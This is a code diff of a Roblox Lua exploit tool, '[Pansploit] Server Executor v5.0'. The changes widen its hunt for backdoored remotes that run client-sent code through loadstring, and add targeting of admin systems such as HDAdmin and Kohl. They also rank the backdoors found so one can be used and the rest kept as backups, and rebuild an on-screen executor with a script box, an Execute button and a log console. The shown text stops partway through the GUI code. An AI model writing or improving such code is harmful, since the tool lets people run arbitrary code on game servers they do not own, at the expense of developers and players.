@@ -1,16 +1,21 @@
 local _bs = {}
 _bs._a = false
 _bs._selected = nil
+_bs._selectedType = nil
 _bs._backup = {}
 _bs._monitor = nil
 _bs._gameMonitor = nil
 _bs._r = {}
 _bs._n = {}
+_bs._f = {}
 _bs._m = {}
 _bs._s = tick()
 _bs._cb = nil
 _bs._currentGameId = nil
-_bs._gui = nil  -- [NEW] GUI reference
+_bs._gui = nil
+_bs._guiStatusDot = nil
+_bs._guiStatusText = nil
+_bs._guiConsole = nil
 
 if not _G._pans_backdoor_storage then
     _G._pans_backdoor_storage = {}
@@ -20,9 +25,9 @@ local _storage = _G._pans_backdoor_storage
 local _cfg = {
     debug = false,
     stealth = true,
-    maxScanDepth = 20,
+    maxScanDepth = 25,
     executionDelay = 0.05,
-    monitorInterval = 2,
+    monitorInterval = 1.5,
     autoReconnect = true
 }
 
@@ -37,304 +42,62 @@ local _pat = {
     "loadstring%(%s*%)%(%)",
     "OnServerEvent%:Connect%(.-loadstring",
     "OnServerInvoke%s*=%s*function.-loadstring",
+    "OnServerEvent:connect%(.-loadstring",
     "Instance%.new%([\"']RemoteEvent[\"'].-loadstring",
     "getfenv%(%s*%)%[%s*loadstring",
     "setfenv%(.-loadstring",
+    "_G%[.-%].-loadstring",
+    "rawset%(.-loadstring",
+    "%(loadstring%)%(%)",
 }
 
 local _cat = {
-    normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback"},
-    suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect"}
+    normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback", "Bindable"},
+    suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect", "Spread", "getfenv", "setfenv"},
+    backdoored = {"Admin", "HDAdmin", "Kohl", "BTools", "Gear", "Give", "Tools", "Command", "Cmd", "Ban", "Kick", "Kill"}
 }
+
+local _consoleLogs = {}
+local _maxConsoleLines = 100
+
+local function _addConsoleLog(message, msgType)
+    msgType = msgType or "INFO"
+    local timestamp = os.date("%H:%M:%S")
+    local logEntry = string.format("[%s] [%s] %s", timestamp, msgType, message)
+    
+    table.insert(_consoleLogs, 1, logEntry)
+    
+    if #_consoleLogs > _maxConsoleLines then
+        table.remove(_consoleLogs)
+    end
+    
+    if _bs._guiConsole then
+        pcall(function()
+            _bs._guiConsole.Text = table.concat(_consoleLogs, "\n")
+        end)
+    end
+end
 
 local function _log(m, t)
     t = t or "INFO"
-    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" or t == "GUI" then
+    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" or t == "GUI" or t == "INFECTED" or t == "MANAGER" then
         print(("[BD:%s] %s"):format(t, m))
     end
     if _bs._cb then _bs._cb(m, t) end
+    _addConsoleLog(m, t)
 end
 
--- [NEW] Create GUI Executor
-local function _createGUI()
-    if _bs._gui then
-        pcall(function() _bs._gui:Destroy() end)
+local function _isBackdooredFunc(n)
+    if not n then return false, 0 end
+    n = tostring(n):lower()
+    local score = 0
+    for _, p in ipairs(_cat.backdoored) do
+        if n:find(p:lower()) then score = score + 25 end
     end
-    
-    local player = game:GetService("Players").LocalPlayer
-    if not player then return nil end
-    
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "PanExecutor"
-    screenGui.ResetOnSpawn = false
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
-    -- Parent to CoreGui or PlayerGui
-    pcall(function()
-        screenGui.Parent = game:GetService("CoreGui")
-    end)
-    
-    if not screenGui.Parent then
-        screenGui.Parent = player:WaitForChild("PlayerGui")
+    if n:find("function") or n:find("func") or n:find("callback") then
+        score = score + 15
     end
-    
-    _bs._gui = screenGui
-    
-    -- Main Frame
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 400, 0, 300)
-    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Active = true
-    mainFrame.Draggable = true  -- Built-in draggable
-    mainFrame.Parent = screenGui
-    
-    -- Corner radius
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 8)
-    corner.Parent = mainFrame
-    
-    -- Title Bar
-    local titleBar = Instance.new("Frame")
-    titleBar.Name = "TitleBar"
-    titleBar.Size = UDim2.new(1, 0, 0, 30)
-    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    titleBar.BorderSizePixel = 0
-    titleBar.Parent = mainFrame
-    
-    local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 8)
-    titleCorner.Parent = titleBar
-    
-    -- Title Text
-    local titleText = Instance.new("TextLabel")
-    titleText.Name = "Title"
-    titleText.Size = UDim2.new(1, -100, 1, 0)
-    titleText.Position = UDim2.new(0, 10, 0, 0)
-    titleText.BackgroundTransparency = 1
-    titleText.Text = "[Pansploit] Server Executor"
-    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleText.Font = Enum.Font.SourceSansBold
-    titleText.TextSize = 16
-    titleText.TextXAlignment = Enum.TextXAlignment.Left
-    titleText.Parent = titleBar
-    
-    -- Status Indicator (Green/Red dot)
-    local statusDot = Instance.new("Frame")
-    statusDot.Name = "StatusDot"
-    statusDot.Size = UDim2.new(0, 10, 0, 10)
-    statusDot.Position = UDim2.new(1, -85, 0.5, -5)
-    statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green = active
-    statusDot.BorderSizePixel = 0
-    statusDot.Parent = titleBar
-    
-    local statusCorner = Instance.new("UICorner")
-    statusCorner.CornerRadius = UDim.new(1, 0)
-    statusCorner.Parent = statusDot
-    
-    -- Status Text
-    local statusText = Instance.new("TextLabel")
-    statusText.Name = "StatusText"
-    statusText.Size = UDim2.new(0, 60, 1, 0)
-    statusText.Position = UDim2.new(1, -75, 0, 0)
-    statusText.BackgroundTransparency = 1
-    statusText.Text = "Active"
-    statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
-    statusText.Font = Enum.Font.SourceSans
-    statusText.TextSize = 14
-    statusText.Parent = titleBar
-    
-    -- Store references for updating
-    _bs._guiStatusDot = statusDot
-    _bs._guiStatusText = statusText
-    
-    -- Minimize Button (-)
-    local minButton = Instance.new("TextButton")
-    minButton.Name = "Minimize"
-    minButton.Size = UDim2.new(0, 25, 0, 25)
-    minButton.Position = UDim2.new(1, -55, 0, 2)
-    minButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    minButton.Text = "-"
-    minButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    minButton.Font = Enum.Font.SourceSansBold
-    minButton.TextSize = 18
-    minButton.Parent = titleBar
-    
-    local minCorner = Instance.new("UICorner")
-    minCorner.CornerRadius = UDim.new(0, 4)
-    minCorner.Parent = minButton
-    
-    -- Close/Disconnect Button (X)
-    local closeButton = Instance.new("TextButton")
-    closeButton.Name = "Close"
-    closeButton.Size = UDim2.new(0, 25, 0, 25)
-    closeButton.Position = UDim2.new(1, -28, 0, 2)
-    closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeButton.Text = "X"
-    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeButton.Font = Enum.Font.SourceSansBold
-    closeButton.TextSize = 14
-    closeButton.Parent = titleBar
-    
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 4)
-    closeCorner.Parent = closeButton
-    
-    -- Script TextBox
-    local textBox = Instance.new("TextBox")
-    textBox.Name = "ScriptBox"
-    textBox.Size = UDim2.new(1, -20, 1, -80)
-    textBox.Position = UDim2.new(0, 10, 0, 40)
-    textBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    textBox.PlaceholderText = "-- Enter server-side script here..."
-    textBox.Text = ""
-    textBox.Font = Enum.Font.SourceSans
-    textBox.TextSize = 14
-    textBox.TextXAlignment = Enum.TextXAlignment.Left
-    textBox.TextYAlignment = Enum.TextYAlignment.Top
-    textBox.ClearTextOnFocus = false
-    textBox.MultiLine = true
-    textBox.TextWrapped = true
-    textBox.Parent = mainFrame
-    
-    local textCorner = Instance.new("UICorner")
-    textCorner.CornerRadius = UDim.new(0, 4)
-    textCorner.Parent = textBox
-    
-    -- Button Frame
-    local buttonFrame = Instance.new("Frame")
-    buttonFrame.Name = "ButtonFrame"
-    buttonFrame.Size = UDim2.new(1, -20, 0, 30)
-    buttonFrame.Position = UDim2.new(0, 10, 1, -35)
-    buttonFrame.BackgroundTransparency = 1
-    buttonFrame.Parent = mainFrame
-    
-    -- Execute Button
-    local execButton = Instance.new("TextButton")
-    execButton.Name = "Execute"
-    execButton.Size = UDim2.new(0.32, -5, 1, 0)
-    execButton.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
-    execButton.Text = "Execute"
-    execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    execButton.Font = Enum.Font.SourceSansBold
-    execButton.TextSize = 14
-    execButton.Parent = buttonFrame
-    
-    local execCorner = Instance.new("UICorner")
-    execCorner.CornerRadius = UDim.new(0, 4)
-    execCorner.Parent = execButton
-    
-    -- Clear Button
-    local clearButton = Instance.new("TextButton")
-    clearButton.Name = "Clear"
-    clearButton.Size = UDim2.new(0.32, -5, 1, 0)
-    clearButton.Position = UDim2.new(0.34, 0, 0, 0)
-    clearButton.BackgroundColor3 = Color3.fromRGB(100, 100, 0)
-    clearButton.Text = "Clear"
-    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    clearButton.Font = Enum.Font.SourceSansBold
-    clearButton.TextSize = 14
-    clearButton.Parent = buttonFrame
-    
-    local clearCorner = Instance.new("UICorner")
-    clearCorner.CornerRadius = UDim.new(0, 4)
-    clearCorner.Parent = clearButton
-    
-    -- Disconnect Button
-    local discButton = Instance.new("TextButton")
-    discButton.Name = "Disconnect"
-    discButton.Size = UDim2.new(0.32, -5, 1, 0)
-    discButton.Position = UDim2.new(0.68, 5, 0, 0)
-    discButton.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
-    discButton.Text = "Disconnect"
-    discButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    discButton.Font = Enum.Font.SourceSansBold
-    discButton.TextSize = 14
-    discButton.Parent = buttonFrame
-    
-    local discCorner = Instance.new("UICorner")
-    discCorner.CornerRadius = UDim.new(0, 4)
-    discCorner.Parent = discButton
-    
-    -- Button functionality
-    execButton.MouseButton1Click:Connect(function()
-        local script = textBox.Text
-        if script and #script > 0 then
-            _log("GUI Execute clicked", "GUI")
-            local success = _bs.Execute(script)
-            if success then
-                _log("GUI Execute success", "GUI")
-            else
-                _log("GUI Execute failed", "GUI")
-            end
-        else
-            _log("GUI: Empty script", "GUI")
-        end
-    end)
-    
-    clearButton.MouseButton1Click:Connect(function()
-        textBox.Text = ""
-        _log("GUI Clear clicked", "GUI")
-    end)
-    
-    discButton.MouseButton1Click:Connect(function()
-        _log("GUI Disconnect clicked", "GUI")
-        _updateGUIStatus(false)  -- Set to red/disconnected
-        _bs.Disconnect()
-    end)
-    
-    -- Minimize functionality
-    local minimized = false
-    minButton.MouseButton1Click:Connect(function()
-        minimized = not minimized
-        if minimized then
-            textBox.Visible = false
-            buttonFrame.Visible = false
-            mainFrame.Size = UDim2.new(0, 400, 0, 30)
-            minButton.Text = "+"
-        else
-            textBox.Visible = true
-            buttonFrame.Visible = true
-            mainFrame.Size = UDim2.new(0, 400, 0, 300)
-            minButton.Text = "-"
-        end
-    end)
-    
-    -- Close/Hide functionality
-    closeButton.MouseButton1Click:Connect(function()
-        _log("GUI Close clicked", "GUI")
-        screenGui.Enabled = false  -- Hide but don't destroy
-    end)
-    
-    _log("GUI Created successfully", "GUI")
-    return screenGui
-end
-
--- [NEW] Update GUI status indicator
-local function _updateGUIStatus(isActive)
-    if _bs._guiStatusDot and _bs._guiStatusText then
-        if isActive then
-            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green
-            _bs._guiStatusText.Text = "Active"
-            _bs._guiStatusText.TextColor3 = Color3.fromRGB(0, 255, 0)
-        else
-            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- Red
-            _bs._guiStatusText.Text = "Disconnected"
-            _bs._guiStatusText.TextColor3 = Color3.fromRGB(255, 0, 0)
-        end
-    end
-end
-
--- [NEW] Show GUI (if hidden)
-local function _showGUI()
-    if _bs._gui then
-        _bs._gui.Enabled = true
-    else
-        _createGUI()
-    end
+    return score > 0, score
 end
 
 local function _isSus(n)
@@ -363,32 +126,72 @@ local function _analyzeScript(scr)
         Object = scr,
         Name = scr.Name,
         Path = scr:GetFullName(),
+        Source = nil,
         SuspiciousPatterns = {},
         RiskScore = 0,
-        IsBackdoor = false
+        IsBackdoor = false,
+        ExecutionMethod = nil,
+        EntryPoint = nil,
     }
     
     local ok, src = pcall(function() return scr.Source end)
     
     if not ok or not src or src == "" then
         local name = tostring(scr.Name):lower()
-        if name:find("backdoor") or name:find("exploit") or name:find("virus") then
-            info.RiskScore = 100
+        if name:find("backdoor") or name:find("exploit") or name:find("virus") or name:find("admin") then
+            info.RiskScore = 80
             info.IsBackdoor = true
-            table.insert(info.SuspiciousPatterns, "suspicious_name")
+            info.ExecutionMethod = "unknown"
+            table.insert(info.SuspiciousPatterns, "suspicious_name_no_source")
         end
         return info.RiskScore > 50 and info or nil
     end
     
-    for _, pattern in ipairs(_pat) do
-        if src:find(pattern) then
-            table.insert(info.SuspiciousPatterns, pattern)
-            info.RiskScore = info.RiskScore + 40
+    info.Source = src
+    
+    local remoteEventPattern = "(%w+)[%.:]OnServerEvent[%.:]?[Cc]onnect%s*%(%s*function%s*%(%s*[%w_,%s]*%s*%)%s*loadstring%(([%w_]+)%)%(%)"
+    local remoteName, paramName = src:match(remoteEventPattern)
+    if remoteName and paramName then
+        info.RiskScore = 100
+        info.IsBackdoor = true
+        info.ExecutionMethod = "remote_event_loadstring"
+        info.EntryPoint = {
+            type = "RemoteEvent",
+            remoteName = remoteName,
+            paramName = paramName,
+            fullPattern = "OnServerEvent:Connect(function(plr, " .. paramName .. ") loadstring(" .. paramName .. ")() end)"
+        }
+        table.insert(info.SuspiciousPatterns, "remote_event_direct_loadstring")
+    end
+    
+    if not info.IsBackdoor then
+        local remoteFuncPattern = "(%w+)[%.:]OnServerInvoke%s*=%s*function%s*%(%s*[%w_,%s]*%s*%)%s*loadstring%(([%w_]+)%)%(%)"
+        remoteName, paramName = src:match(remoteFuncPattern)
+        if remoteName and paramName then
+            info.RiskScore = 100
+            info.IsBackdoor = true
+            info.ExecutionMethod = "remote_function_loadstring"
+            info.EntryPoint = {
+                type = "RemoteFunction",
+                remoteName = remoteName,
+                paramName = paramName
+            }
+            table.insert(info.SuspiciousPatterns, "remote_function_direct_loadstring")
         end
     end
     
-    if src:find("Instance%.new%s*%(%s*[\"']Remote") then
+    if not info.IsBackdoor then
+        for _, pattern in ipairs(_pat) do
+            if src:find(pattern) then
+                table.insert(info.SuspiciousPatterns, pattern)
+                info.RiskScore = info.RiskScore + 40
+            end
+        end
+    end
+    
+    if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']%s*%)") and src:find("loadstring") then
         info.RiskScore = info.RiskScore + 50
+        info.ExecutionMethod = info.ExecutionMethod or "dynamic_remote"
         table.insert(info.SuspiciousPatterns, "dynamic_remote_creation")
     end
     
@@ -397,17 +200,23 @@ local function _analyzeScript(scr)
         table.insert(info.SuspiciousPatterns, "env_manipulation")
     end
     
+    if src:find("_G%s*%[") or src:find("shared%s*%[") or src:find("getrawmetatable") then
+        info.RiskScore = info.RiskScore + 20
+        table.insert(info.SuspiciousPatterns, "global_manipulation")
+    end
+    
     info.IsBackdoor = info.RiskScore >= 60
     return info.RiskScore > 30 and info or nil
 end
 
 local function _scan(i, d)
     d = d or 0
-    if d > _cfg.maxScanDepth then return {}, {}, {} end
+    if d > _cfg.maxScanDepth then return {}, {}, {}, {} end
     
     local rmt = {}
     local scr = {}
     local mdl = {}
+    local funcs = {}
     
     local success, isRemote = pcall(function()
         return i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction)
@@ -416,12 +225,23 @@ local function _scan(i, d)
     if success and isRemote then
         local sus, score = _isSus(i.Name)
         local norm = _isNormal(i.Name)
-        local cat = sus and "MALICIOUS" or (norm and "NORMAL" or "UNKNOWN")
+        local backdoored, bdScore = _isBackdooredFunc(i.Name)
+        local cat = "UNKNOWN"
+        
+        if sus then
+            cat = "MALICIOUS"
+            score = score + bdScore
+        elseif backdoored then
+            cat = "BACKDOORED_FUNC"
+            score = score + bdScore + 40
+        elseif norm then
+            cat = "NORMAL"
+        end
         
         local id = ""
         pcall(function() id = i:GetDebugId() end)
         
-        table.insert(rmt, {
+        local entry = {
             Object = i,
             Name = i.Name,
             Type = i.ClassName,
@@ -429,10 +249,17 @@ local function _scan(i, d)
             Category = cat,
             RiskScore = score or 0,
             Suspicious = sus,
+            IsBackdooredFunc = backdoored,
             Parent = i.Parent,
             Depth = d,
             InstanceId = id
-        })
+        }
+        
+        if cat == "BACKDOORED_FUNC" then
+            table.insert(funcs, entry)
+        else
+            table.insert(rmt, entry)
+        end
     end
     
     local isScript = pcall(function()
@@ -473,13 +300,14 @@ local function _scan(i, d)
     pcall(function() children = i:GetChildren() end)
     
     for _, c in ipairs(children) do
-        local cr, cs, cm = _scan(c, d + 1)
+        local cr, cs, cm, cf = _scan(c, d + 1)
         for _, v in ipairs(cr) do table.insert(rmt, v) end
         for _, v in ipairs(cs) do table.insert(scr, v) end
         for _, v in ipairs(cm) do table.insert(mdl, v) end
+        for _, v in ipairs(cf) do table.insert(funcs, v) end
     end
     
-    return rmt, scr, mdl
+    return rmt, scr, mdl, funcs
 end
 
 local function _test(r, depth)
@@ -497,6 +325,12 @@ local function _test(r, depth)
             v = true
             m = "infected_container"
             c = c + 50
+        end
+        
+        if r.IsBackdooredFunc then
+            v = true
+            m = "backdoored_admin_system"
+            c = c + 60
         end
         
         local isModel = pcall(function() return p:IsA("Model") end)
@@ -520,9 +354,9 @@ local function _test(r, depth)
         end
     end
     
-    if r.Category == "MALICIOUS" then
+    if r.Category == "MALICIOUS" or r.Category == "BACKDOORED_FUNC" then
         v = true
-        m = m or "categorized_malicious"
+        m = m or "categorized_" .. r.Category:lower()
         c = c + 30
     end
     
@@ -542,24 +376,474 @@ local function _selectRandomBackdoor(backdoors)
     if #backdoors == 0 then return nil, {} end
     if #backdoors == 1 then return backdoors[1], {} end
     
-    math.randomseed(tick())
-    local selectedIndex = math.random(1, #backdoors)
-    local selected = backdoors[selectedIndex]
-    
-    local backup = {}
-    for i, bd in ipairs(backdoors) do
-        if i ~= selectedIndex then
-            table.insert(backup, bd)
+    table.sort(backdoors, function(a, b)
+        if a.Category == "BACKDOORED_FUNC" and b.Category ~= "BACKDOORED_FUNC" then
+            return true
+        elseif a.Category ~= "BACKDOORED_FUNC" and b.Category == "BACKDOORED_FUNC" then
+            return false
+        else
+            return (a.Confidence or 0) > (b.Confidence or 0)
         end
+    end)
+    
+    local selected = backdoors[1]
+    local backup = {}
+    for i = 2, #backdoors do
+        table.insert(backup, backdoors[i])
     end
     
     return selected, backup
+end
+
+local function _createGUI()
+    if _bs._gui then
+        pcall(function() _bs._gui:Destroy() end)
+    end
+    
+    _consoleLogs = {}
+    
+    local player = game:GetService("Players").LocalPlayer
+    if not player then return nil end
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "PanExecutorV5"
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    pcall(function()
+        screenGui.Parent = game:GetService("CoreGui")
+    end)
+    
+    if not screenGui.Parent then
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+    end
+    
+    _bs._gui = screenGui
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0, 500, 0, 400)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = screenGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = mainFrame
+    
+    local shadow = Instance.new("ImageLabel")
+    shadow.Name = "Shadow"
+    shadow.Size = UDim2.new(1, 20, 1, 20)
+    shadow.Position = UDim2.new(0, -10, 0, -10)
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+    shadow.ImageTransparency = 0.6
+    shadow.ScaleType = Enum.ScaleType.Slice
+    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+    shadow.ZIndex = -1
+    shadow.Parent = mainFrame
+    
+    local titleBar = Instance.new("Frame")
+    titleBar.Name = "TitleBar"
+    titleBar.Size = UDim2.new(1, 0, 0, 35)
+    titleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = mainFrame
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 10)
+    titleCorner.Parent = titleBar
+    
+    local titleFix = Instance.new("Frame")
+    titleFix.Size = UDim2.new(1, 0, 0.5, 0)
+    titleFix.Position = UDim2.new(0, 0, 0.5, 0)
+    titleFix.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    titleFix.BorderSizePixel = 0
+    titleFix.Parent = titleBar
+    
+    local titleText = Instance.new("TextLabel")
+    titleText.Name = "Title"
+    titleText.Size = UDim2.new(1, -150, 1, 0)
+    titleText.Position = UDim2.new(0, 15, 0, 0)
+    titleText.BackgroundTransparency = 1
+    titleText.Text = "[Pansploit] Server Executor v5.0"
+    titleText.TextColor3 = Color3.fromRGB(0, 200, 255)
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextSize = 16
+    titleText.TextXAlignment = Enum.TextXAlignment.Left
+    titleText.Parent = titleBar
+    
+    local statusFrame = Instance.new("Frame")
+    statusFrame.Name = "StatusFrame"
+    statusFrame.Size = UDim2.new(0, 100, 0, 25)
+    statusFrame.Position = UDim2.new(1, -110, 0.5, -12)
+    statusFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    statusFrame.BorderSizePixel = 0
+    statusFrame.Parent = titleBar
+    
+    local statusCorner2 = Instance.new("UICorner")
+    statusCorner2.CornerRadius = UDim.new(0, 6)
+    statusCorner2.Parent = statusFrame
+    
+    local statusDot = Instance.new("Frame")
+    statusDot.Name = "StatusDot"
+    statusDot.Size = UDim2.new(0, 10, 0, 10)
+    statusDot.Position = UDim2.new(0, 8, 0.5, -5)
+    statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+    statusDot.BorderSizePixel = 0
+    statusDot.Parent = statusFrame
+    
+    local statusDotCorner = Instance.new("UICorner")
+    statusDotCorner.CornerRadius = UDim.new(1, 0)
+    statusDotCorner.Parent = statusDot
+    
+    local statusText = Instance.new("TextLabel")
+    statusText.Name = "StatusText"
+    statusText.Size = UDim2.new(1, -25, 1, 0)
+    statusText.Position = UDim2.new(0, 22, 0, 0)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "Active"
+    statusText.TextColor3 = Color3.fromRGB(0, 255, 100)
+    statusText.Font = Enum.Font.GothamSemibold
+    statusText.TextSize = 12
+    statusText.Parent = statusFrame
+    
+    _bs._guiStatusDot = statusDot
+    _bs._guiStatusText = statusText
+    
+    local minButton = Instance.new("TextButton")
+    minButton.Name = "Minimize"
+    minButton.Size = UDim2.new(0, 30, 0, 25)
+    minButton.Position = UDim2.new(1, -75, 0, 5)
+    minButton.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
+    minButton.Text = "−"
+    minButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    minButton.Font = Enum.Font.GothamBold
+    minButton.TextSize = 18
+    minButton.Parent = titleBar
+    
+    local minCorner = Instance.new("UICorner")
+    minCorner.CornerRadius = UDim.new(0, 6)
+    minCorner.Parent = minButton
+    
+    local closeButton = Instance.new("TextButton")
+    closeButton.Name = "Close"
+    closeButton.Size = UDim2.new(0, 30, 0, 25)
+    closeButton.Position = UDim2.new(1, -40, 0, 5)
+    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    closeButton.Text = "×"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.TextSize = 18
+    closeButton.Parent = titleBar
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 6)
+    closeCorner.Parent = closeButton
+    
+    local textBoxFrame = Instance.new("Frame")
+    textBoxFrame.Name = "TextBoxFrame"
+    textBoxFrame.Size = UDim2.new(1, -20, 0, 140)
+    textBoxFrame.Position = UDim2.new(0, 10, 0, 45)
+    textBoxFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    textBoxFrame.BorderSizePixel = 0
+    textBoxFrame.Parent = mainFrame
+    
+    local textBoxCorner = Instance.new("UICorner")
+    textBoxCorner.CornerRadius = UDim.new(0, 8)
+    textBoxCorner.Parent = textBoxFrame
+    
+    local textBox = Instance.new("TextBox")
+    textBox.Name = "ScriptBox"
+    textBox.Size = UDim2.new(1, -10, 1, -10)
+    textBox.Position = UDim2.new(0, 5, 0, 5)
+    textBox.BackgroundTransparency = 1
+    textBox.TextColor3 = Color3.fromRGB(240, 240, 240)
+    textBox.PlaceholderText = "-- Enter server-side script here (require, loadstring, etc.)..."
+    textBox.Text = ""
+    textBox.Font = Enum.Font.Code
+    textBox.TextSize = 13
+    textBox.TextXAlignment = Enum.TextXAlignment.Left
+    textBox.TextYAlignment = Enum.TextYAlignment.Top
+    textBox.ClearTextOnFocus = false
+    textBox.MultiLine = true
+    textBox.TextWrapped = true
+    textBox.Parent = textBoxFrame
+    
+    local consoleFrame = Instance.new("Frame")
+    consoleFrame.Name = "ConsoleFrame"
+    consoleFrame.Size = UDim2.new(1, -20, 0, 100)
+    consoleFrame.Position = UDim2.new(0, 10, 0, 190)
+    consoleFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    consoleFrame.BorderSizePixel = 0
+    consoleFrame.Parent = mainFrame
+    
+    local consoleCorner = Instance.new("UICorner")
+    consoleCorner.CornerRadius = UDim.new(0, 8)
+    consoleCorner.Parent = consoleFrame
+    
+    local consoleLabel = Instance.new("TextLabel")
+    consoleLabel.Name = "ConsoleLabel"
+    consoleLabel.Size = UDim2.new(0, 60, 0, 20)
+    consoleLabel.Position = UDim2.new(0, 5, 0, 0)
+    consoleLabel.BackgroundTransparency = 1
+    consoleLabel.Text = "Console"
+    consoleLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    consoleLabel.Font = Enum.Font.GothamSemibold
+    consoleLabel.TextSize = 11
+    consoleLabel.Parent = consoleFrame
+    
+    local consoleText = Instance.new("TextLabel")
+    consoleText.Name = "ConsoleText"
+    consoleText.Size = UDim2.new(1, -10, 1, -25)
+    consoleText.Position = UDim2.new(0, 5, 0, 20)
+    consoleText.BackgroundTransparency = 1
+    consoleText.Text = ""
+    consoleText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    consoleText.Font = Enum.Font.Code
+    consoleText.TextSize = 11
+    consoleText.TextXAlignment = Enum.TextXAlignment.Left
+    consoleText.TextYAlignment = Enum.TextYAlignment.Top
+    consoleText.TextWrapped = true
+    consoleText.Parent = consoleFrame
+    
+    _bs._guiConsole = consoleText
+    
+    local buttonFrame = Instance.new("Frame")
+    buttonFrame.Name = "ButtonFrame"
+    buttonFrame.Size = UDim2.new(1, -20, 0, 35)
+    buttonFrame.Position = UDim2.new(0, 10, 1, -50)
+    buttonFrame.BackgroundTransparency = 1
+    buttonFrame.Parent = mainFrame
+    
+    local execButton = Instance.new("TextButton")
+    execButton.Name = "Execute"
+    execButton.Size = UDim2.new(0.24, -5, 1, 0)
+    execButton.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
+    execButton.Text = "▶ Execute"
+    execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    execButton.Font = Enum.Font.GothamBold
+    execButton.TextSize = 14
+    execButton.Parent = buttonFrame
+    
+    local execCorner = Instance.new("UICorner")
+    execCorner.CornerRadius = UDim.new(0, 8)
+    execCorner.Parent = execButton
+    
+    local clearButton = Instance.new("TextButton")
+    clearButton.Name = "Clear"
+    clearButton.Size = UDim2.new(0.24, -5, 1, 0)
+    clearButton.Position = UDim2.new(0.25, 0, 0, 0)
+    clearButton.BackgroundColor3 = Color3.fromRGB(150, 120, 0)
+    clearButton.Text = "🗑 Clear"
+    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    clearButton.Font = Enum.Font.GothamBold
+    clearButton.TextSize = 14
+    clearButton.Parent = buttonFrame
+    
+    local clearCorner = Instance.new("UICorner")
+    clearCorner.CornerRadius = UDim.new(0, 8)
